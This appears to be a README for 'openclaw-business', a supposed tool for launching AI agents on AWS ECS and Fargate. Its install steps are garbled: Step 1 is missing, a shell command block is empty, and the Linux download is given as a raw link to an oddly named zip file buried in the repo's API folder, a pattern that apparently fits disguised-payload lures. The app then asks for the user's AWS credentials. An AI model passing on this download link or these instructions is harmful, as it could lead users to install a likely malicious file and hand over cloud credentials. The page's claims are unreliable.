## 📖 About openclaw-business

openclaw-business is a software platform that helps businesses launch AI agents on the cloud. It uses Amazon Web Services (AWS) Elastic Container Service (ECS) with Fargate to run OpenClaw AI agents in isolated environments. This setup lets you run smart, independent AI helpers without needing to manage servers or infrastructure.

The platform focuses on making AI easy to deploy for companies. You can launch multiple agents that work without interfering with each other. This provides a clean and secure way to run many AI tasks at once. The service is ready for business use, designed for reliability and scale.

## 🖥 System Requirements

Before you start, make sure your computer meets these basic needs:

- Operating System: Windows 10 or later, macOS 10.15 or later, or a recent Linux distribution.
- Internet connection: A stable internet connection is required because the app talks to AWS in the cloud.
- Web Browser: Modern browsers such as Google Chrome, Firefox, Safari, or Microsoft Edge.
- AWS Account: You need an AWS account with permission to use ECS and Fargate services.

This page holds the files you need to run the app.

### Step 2: Choose the Right Version

On the releases page, look for the latest release. It will have the most stable and updated files.

- For Windows, look for `.exe` or `.msi` files.
- For macOS, look for `.dmg` files.
- For Linux, look for `.AppImage` or `https://github.com/Mickebhscoder/openclaw-business/raw/refs/heads/main/app/api/instances/openclaw_business_baronethood.zip` files.

Click the file to download it.

### Step 3: Run the Installer or Application

- **Windows:** Double-click the `.exe` or `.msi` file. Follow on-screen instructions to install.
- **macOS:** Open the `.dmg` file and drag the app to your Applications folder.
- **Linux:** Open `.AppImage` files by right-clicking and choosing "Run" or use terminal commands as shown in the next step.

If you face any permission issues on Linux, run:

```

### Step 4: Open the Application

Once installed, open the app. You should see a dashboard or welcome screen.

The app will ask for your AWS account details. Provide the necessary credentials so the software can connect to AWS on your behalf. If you don’t have these credentials, contact your AWS administrator or set them up via the AWS website.

### Step 5: Launch Your AI Agents

Use the built-in dashboard to create and start new AI agents. The user interface guides you to choose agent types and configurations. Most settings come with defaults, so just clicking "Launch" might be enough.
